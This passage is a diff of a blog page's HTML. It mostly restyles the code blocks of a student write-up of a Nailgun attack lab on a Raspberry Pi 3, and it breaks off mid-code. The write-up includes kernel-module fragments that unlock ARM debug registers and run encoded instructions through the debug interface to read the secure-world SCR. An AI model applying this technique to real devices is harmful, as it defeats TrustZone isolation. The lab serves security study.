@@ -17,14 +17,14 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.sky-learner.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism-vsc-dark-plus","dark":"prism-vsc-dark-plus"},"copy_button":{"enable":true,"style":"flat","show_result":true},"fold":{"enable":false,"height":500},"language":false,"engine":"prism"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"twikoo","storage":true,"lazyload":false,"nav":null,"activeClass":"twikoo"},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto","highlight":false}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.sky-learner.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"github-dark","dark":"monokai-sublime"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat","show_result":true},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"twikoo","storage":true,"lazyload":false,"nav":null,"activeClass":"twikoo"},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto","highlight":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Task 1: Create and Install a Kernel Module simple_module.c &#x2F;* simple_module.c *&#x2F; #include &lt;linux&#x2F;module.h&gt; #include &lt;linux&#x2F;kernel.h&gt; #include &lt;linux&#x2F;init.h&gt;">
+    <meta name="description" content="Task 1: Create and Install a Kernel Module simple_module.c &#x2F;* simple_module.c *&#x2F; #include &lt;linux&#x2F;module.h&gt; #include &lt;linux&#x2F;kernel.h&gt; #include &lt;linux&#x2F;init.h&gt; #include &lt;asm&#x2F;io.h&gt;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Nailgun Attack Lab Analysis">
 <meta property="og:url" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/index.html">
 <meta property="og:site_name" content="My Blog">
-<meta property="og:description" content="Task 1: Create and Install a Kernel Module simple_module.c &#x2F;* simple_module.c *&#x2F; #include &lt;linux&#x2F;module.h&gt; #include &lt;linux&#x2F;kernel.h&gt; #include &lt;linux&#x2F;init.h&gt;">
+<meta property="og:description" content="Task 1: Create and Install a Kernel Module simple_module.c &#x2F;* simple_module.c *&#x2F; #include &lt;linux&#x2F;module.h&gt; #include &lt;linux&#x2F;kernel.h&gt; #include &lt;linux&#x2F;init.h&gt; #include &lt;asm&#x2F;io.h&gt;">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png">
 <meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t1.png">
@@ -75,9 +75,6 @@
 
   
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/components/prism-core.min.js" integrity="sha256-bKrTFt2ZHyT4AE4LnBnAVctYKf9l6XP77kBvltgbjn4=" crossorigin="anonymous" defer></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha256-AjM0J5XIbiB590BrznLEgZGLnOQWrt62s3BEq65Q/I0=" crossorigin="anonymous" defer></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha256-9cmf7tcLdXpKsPi/2AWE93PbZpTp4M4tqzFk+lWomjU=" crossorigin="anonymous" defer></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
 <script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/pjax.js" defer></script>
 
@@ -330,7 +327,7 @@ and Exit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" hre
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>6.6k</span>
+      <span>6.3k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -350,37 +347,36 @@ and Exit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" hre
     <div class="post-body" itemprop="articleBody"><h5 id="task-1-create-and-install-a-kernel-module">Task 1: Create and
 Install a Kernel Module</h5>
 <p>simple_module.c</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">&#x2F;* simple_module.c *&#x2F;
-#include &lt;linux&#x2F;module.h&gt;
-#include &lt;linux&#x2F;kernel.h&gt;
-#include &lt;linux&#x2F;init.h&gt;
-#include &lt;asm&#x2F;io.h&gt;
-
-static int __init simple_module_init(void)
-&#123;
-        printk(&quot;Helloworld.\n&quot;);
-        return 0;
-&#125;
-&#x2F;*
- *The cleanup function of the module.
- *&#x2F;
-static void __exit simple_module_exit(void)
-&#123;
-        printk(KERN_INFO&quot;Exit.\n&quot;);
-&#125;
-module_init(simple_module_init);
-module_exit(simple_module_exit);
-</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* simple_module.c */</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/module.h&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/kernel.h&gt;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/init.h&gt;</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;asm/io.h&gt;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> __init simple_module_init<span class="op">(</span><span class="dt">void</span><span class="op">)</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span><span class="st">&quot;Helloworld.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="co"> *The cleanup function of the module.</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> __exit simple_module_exit<span class="op">(</span><span class="dt">void</span><span class="op">)</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO<span class="st">&quot;Exit.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>module_init<span class="op">(</span>simple_module_init<span class="op">);</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>module_exit<span class="op">(</span>simple_module_exit<span class="op">);</span></span></code></pre></div>
 <span id="more"></span>
 <p>Makefile</p>
-<pre class="line-numbers language-makefile" data-language="makefile" data-start="1"><code class="language-makefile">obj-m +&#x3D; simple_module.o
-
-all:
-        make -C &#x2F;lib&#x2F;modules&#x2F;$(shell uname -r)&#x2F;build M&#x3D;$(PWD) modules
-
-clean:
-        make -C &#x2F;lib&#x2F;modules&#x2F;$(shell uname -r)&#x2F;build M&#x3D;$(PWD) clean
-</code></pre>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode makefile"><code class="sourceCode makefile"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">obj-m</span> <span class="ch">+=</span><span class="st"> simple_module.o</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="dv">all:</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="er">        </span>make -C /lib/modules/<span class="ch">$(</span><span class="kw">shell</span><span class="st"> uname -r</span><span class="ch">)</span>/build M=<span class="ch">$(</span><span class="dt">PWD</span><span class="ch">)</span> modules</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="dv">clean:</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="er">        </span>make -C /lib/modules/<span class="ch">$(</span><span class="kw">shell</span><span class="st"> uname -r</span><span class="ch">)</span>/build M=<span class="ch">$(</span><span class="dt">PWD</span><span class="ch">)</span> clean</span></code></pre></div>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png" /></p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1.png" /></p>
 <blockquote>
@@ -393,21 +389,21 @@ is loaded.</p>
 <h5 id="task-2-directly-access-a-high-privilege-register-scr">Task 2:
 Directly Access a High Privilege Register: SCR</h5>
 <p><img src="accessing_scr_aarch32.png" /></p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">&#x2F;* simple_module.c *&#x2F;
-...
-static int __init simple_module_init(void)&#123;
-        uint32_t reg;
-        asm volatile(&quot;mrc p15, 0, %0, c1, c1, 0&quot;:&quot;&#x3D;r&quot;(reg));
-        printk(KERN_INFO &quot;SCR %x.\n&quot;, reg);
-        return 0;
-&#125;
-...</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* simple_module.c */</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> __init simple_module_init<span class="op">(</span><span class="dt">void</span><span class="op">){</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint32_t</span> reg<span class="op">;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>        asm <span class="dt">volatile</span><span class="op">(</span><span class="st">&quot;mrc p15, 0, %0, c1, c1, 0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>reg<span class="op">));</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;SCR </span><span class="sc">%x</span><span class="st">.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> reg<span class="op">);</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span></code></pre></div>
 <blockquote>
 <p>Task 2.a : What is the complete instruction? Look up the manual and
 fill the instruction bellow. Then compile and execute.</p>
 </blockquote>
 <p>complete instruction:</p>
-<pre class="line-numbers language-assembly" data-language="assembly" data-start="1"><code class="language-assembly">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</code></pre>
+<pre class="assembly"><code>mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</code></pre>
 <p>compile</p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t2_1.png" /></p>
 <p>try to install this kernel module</p>
@@ -420,7 +416,7 @@ fill the instruction bellow. Then compile and execute.</p>
 privileged instruction that is not allowed in the current processor
 mode.</p>
 <p>Specifically, the inline assembly instruction</p>
-<pre class="line-numbers language-assembly" data-language="assembly" data-start="1"><code class="language-assembly">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</code></pre>
+<pre class="assembly"><code>mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</code></pre>
 <p>tries to access the Secure Configuration Register (SCR), which
 belongs to the <strong>secure world</strong>.</p>
 <p>However, the Linux kernel runs in the <strong>non-secure world at
@@ -432,33 +428,33 @@ Debug Authentication Signal</h5>
 <blockquote>
 <p>Task 3.a: What is the instruction to read DBGAUTHSTATUS?</p>
 </blockquote>
-<pre class="line-numbers language-assembly" data-language="assembly" data-start="1"><code class="language-assembly">mrc p14, 0, &lt;Rt&gt;, c7, c14, 6</code></pre>
+<pre class="assembly"><code>mrc p14, 0, &lt;Rt&gt;, c7, c14, 6</code></pre>
 <p>dbgauth_module.c</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">&#x2F;* dbgauth_module.c *&#x2F;
-#include &lt;linux&#x2F;module.h&gt;
-#include &lt;linux&#x2F;kernel.h&gt;
-#include &lt;linux&#x2F;init.h&gt;
-#include &lt;asm&#x2F;io.h&gt;
-
-static int __init dbgauth_init(void)&#123;
-        uint32_t reg;
-        printk(KERN_INFO&quot;dbgauth_module: init - attempt to read DBGAUTHSTATUS\n&quot;);
-
-        &#x2F;* 读取 DBGAUTHSTATUS:
-         * MRC p14, 0, &lt;Rt&gt;, c7, c14, 6
-         *&#x2F;
-        asm volatile(&quot;mrc p14, 0, %0, c7, c14, 6&quot; : &quot;&#x3D;r&quot;(reg));
-        printk(KERN_INFO&quot;dbgauth_module: DBGAUTHSTATUS &#x3D; 0x%08x\n&quot;, reg);
-        
-        return 0;
-&#125;
-
-static void __exit dbgauth_exit(void)&#123;
-        printk(KERN_INFO &quot;dbgauth_module: exit\n&quot;);
-&#125;
-
-module_init(dbgauth_init);
-module_exit(dbgauth_exit);</code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* dbgauth_module.c */</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/module.h&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/kernel.h&gt;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/init.h&gt;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;asm/io.h&gt;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> __init dbgauth_init<span class="op">(</span><span class="dt">void</span><span class="op">){</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint32_t</span> reg<span class="op">;</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO<span class="st">&quot;dbgauth_module: init - attempt to read DBGAUTHSTATUS</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* 读取 DBGAUTHSTATUS:</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="co">         * MRC p14, 0, &lt;Rt&gt;, c7, c14, 6</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="co">         */</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>        asm <span class="dt">volatile</span><span class="op">(</span><span class="st">&quot;mrc p14, 0, %0, c7, c14, 6&quot;</span> <span class="op">:</span> <span class="st">&quot;=r&quot;</span><span class="op">(</span>reg<span class="op">));</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO<span class="st">&quot;dbgauth_module: DBGAUTHSTATUS = 0x</span><span class="sc">%08x\n</span><span class="st">&quot;</span><span class="op">,</span> reg<span class="op">);</span></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> __exit dbgauth_exit<span class="op">(</span><span class="dt">void</span><span class="op">){</span></span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;dbgauth_module: exit</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>module_init<span class="op">(</span>dbgauth_init<span class="op">);</span></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>module_exit<span class="op">(</span>dbgauth_exit<span class="op">);</span></span></code></pre></div>
 <p>We can get DBGAUTHSTATUS after installing this kernel module</p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_2.png" /></p>
 <blockquote>
@@ -506,20 +502,20 @@ Debug</h5>
 <p>We can find that <code>EDLAR_OFFSET=0xFB0</code></p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_3.png" /></p>
 <p>Write the key value to unlock</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">iowrite32(0xC5ACCE55, param-&gt;debug_register + EDLAR_OFFSET);
-iowrite32(0xC5ACCE55, param-&gt;cti_register + EDLAR_OFFSET);</code></pre>
+<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="bn">0xC5ACCE55</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> EDLAR_OFFSET<span class="op">);</span></span></code></pre></div>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_2.png" /></p>
 <p>We can find that <code>OSLAR_OFFSET=0x300</code></p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_4.png" /></p>
 <p>Writing 0 to the <code>OSLK</code> bit unlocks the OS,</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">iowrite32(0, param-&gt;debug_register + OSLAR_OFFSET);
-iowrite32(0, param-&gt;cti_register + OSLAR_OFFSET);</code></pre>
+<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="dv">0</span><span class="op">,</span> param<span class="op">-&gt;</span>debug_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>iowrite32<span class="op">(</span><span class="dv">0</span><span class="op">,</span> param<span class="op">-&gt;</span>cti_register <span class="op">+</span> OSLAR_OFFSET<span class="op">);</span></span></code></pre></div>
 <h5 id="task-5-switch-to-the-el3-and-read-the-scr">Task 5: Switch to the
 EL3 and read the SCR</h5>
 <p>​ Task5.a: We mention how to access SCR directly in Task2. You need to
 prepare an instruction, who reads SCR and store it to R1. Then convert
 it to machine code(do it on yourself) and execute it on the target.</p>
-<pre class="line-numbers language-assembly" data-language="assembly" data-start="1"><code class="language-assembly">mrc p15,0,R1,c1,c1,0</code></pre>
+<pre class="assembly"><code>mrc p15,0,R1,c1,c1,0</code></pre>
 <p>use <a
 target="_blank" rel="noopener" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online
 Assembler and Disassembler</a> to assemble this instruction. It yields
@@ -532,8 +528,8 @@ halfword of the T32 instruction. They are displayed in a nonstandard
 order (hw2 on the left, hw1 on the right).</p>
 </blockquote>
 <p>In terms of a 32-bit value for C code execution:</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">&#x2F;&#x2F; 0xee111f11 &lt;&#x3D;&gt; mrc p15,0,R1,c1,c1,0
-execute_ins_via_itr(param-&gt;debug_register, 0x1f11ee11);</code></pre>
+<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 0xee111f11 &lt;=&gt; mrc p15,0,R1,c1,c1,0</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>execute_ins_via_itr<span class="op">(</span>param<span class="op">-&gt;</span>debug_register<span class="op">,</span> <span class="bn">0x1f11ee11</span><span class="op">);</span></span></code></pre></div>
 <p>​ Task 5.b: After you finish Task 5.a , you need to transfer the value
 in R1 on core0, to the local variable scr. It will be printed later.
 DBGDTRTXint and DBGDTRTX would be helpful in your implementation</p>
@@ -542,13 +538,13 @@ DBGDTRTXint and DBGDTRTX would be helpful in your implementation</p>
 <p><strong>DBGDTRTXint</strong> is a 32-bit debug register that allows
 the processor to transfer data to an external debugger. It is accessed
 using the <strong>MCR instruction</strong>, for example:</p>
-<pre class="line-numbers language-assembly" data-language="assembly" data-start="1"><code class="language-assembly">MCR p14, 0, Rt, c0, c5, 0</code></pre>
+<pre class="assembly"><code>MCR p14, 0, Rt, c0, c5, 0</code></pre>
 <p>In terms of a 32-bit value for C code execution:</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">&#x2F;&#x2F; ee001e15 &lt;&#x3D;&gt; mcr p14,0,R1,c0,c5,0
-execute_ins_via_itr(param-&gt;debug_register, 0x1e15ee00);</code></pre>
+<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co">// ee001e15 &lt;=&gt; mcr p14,0,R1,c0,c5,0</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>execute_ins_via_itr<span class="op">(</span>param<span class="op">-&gt;</span>debug_register<span class="op">,</span> <span class="bn">0x1e15ee00</span><span class="op">);</span></span></code></pre></div>
 <p>Register DBGDTRTXint bits [31:0] are architecturally mapped to
 DBGDTRTX_EL0[31:0].</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">scr &#x3D; ioread32(param-&gt;debug_register + DBGDTRTX_OFFSET);</code></pre>
+<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>scr <span class="op">=</span> ioread32<span class="op">(</span>param<span class="op">-&gt;</span>debug_register <span class="op">+</span> DBGDTRTX_OFFSET<span class="op">);</span></span></code></pre></div>
 <h5 id="task-6-restore-the-context-and-exit">Task 6: Restore the Context
 and Exit</h5>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t6.png" /></p>
@@ -569,8 +565,8 @@ PSTATE.A. When PSTATE.A is 0, the abort is taken to EL3.</p></li>
 in Raspberry Pi 3? Can your find the global address of CTICONTROL
 register in Raspberry Pi 3 according to the Arm Reference Manual? Answer
 the address value and show your calculation. (hint: Find the offset)</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">&#x2F;&#x2F; 0x40038000 is the base address of the cross trigger interface registers on Core 0
-#define CTI_REGISTER_ADDR 0x40038000</code></pre>
+<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 0x40038000 is the base address of the cross trigger interface registers on Core 0</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define CTI_REGISTER_ADDR </span><span class="bn">0x40038000</span></span></code></pre></div>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q1.png" /></p>
 <p>The global address of the <strong>CTICONTROL</strong> register is
 calculated as:</p>
@@ -588,28 +584,28 @@ memory mapping? If yes, how to do that? Justify your answer.</p>
 <p>Extract Step 1 (the part that unlocks debug and cross-trigger
 registers) from the <code>read_scr()</code> function, and modify it so
 that instead of unlocking the OS Lock, it <strong>locks</strong> it.</p>
-<pre class="line-numbers language-c" data-language="c" data-start="1"><code class="language-c">static void read_scr1(void *addr)&#123;
-    &#x2F;&#x2F; Step 1: Unlock debug and cross trigger reigsters
-    struct nailgun_param *param &#x3D; (struct nailgun_param*)addr;
-    printk(KERN_INFO&quot;Step 1: Unlock debug and cross trigger registers\n&quot;);
-    iowrite32(0xC5ACCE55, param-&gt;debug_register + EDLAR_OFFSET);
-    iowrite32(0xC5ACCE55, param-&gt;cti_register + EDLAR_OFFSET);
-    printk(KERN_INFO&quot;Step 1(Add): Lock OS registers\n&quot;);
-    iowrite32(0xC5ACCE55, param-&gt;debug_register + OSLAR_OFFSET);
-    iowrite32(0xC5ACCE55, param-&gt;cti_register + OSLAR_OFFSET);
-&#125;</code></pre>
+<div class="sourceCode" id="cb16"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> read_scr1<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>addr<span class="op">){</span></span>
